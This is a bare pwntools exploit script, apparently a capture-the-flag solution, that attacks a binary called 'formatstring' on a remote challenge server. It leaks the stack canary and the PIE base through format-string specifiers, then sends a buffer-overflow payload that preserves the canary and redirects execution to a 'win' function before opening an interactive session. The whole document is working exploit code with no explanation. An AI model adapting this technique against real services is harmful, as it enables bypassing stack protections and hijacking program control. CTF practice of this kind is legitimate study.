from pwn import *
import time

elf = context.binary = ELF('./formatstring')
rop = ROP(elf)

#p = process()
p = remote('alpha.8059blank.ml', 3002)
#input()

# find canary
time.sleep(1)
p.clean()
p.sendline("%39$p")
canary = int(p.recvline().strip()[2:], 16)
print(hex(canary))

# find pie
p.clean()
p.sendline("%40$p")
pie = int(p.recvline().strip()[2:], 16) - elf.symbols.__libc_csu_init
print(hex(pie))
print(hex(pie + elf.symbols.win))

# rop
payload = flat(
    b'A' * 264,
    canary,
    b'A'*8,
    pie + rop.ret.address,
    pie + elf.symbols.win,
)
p.sendline(payload)
p.interactive()
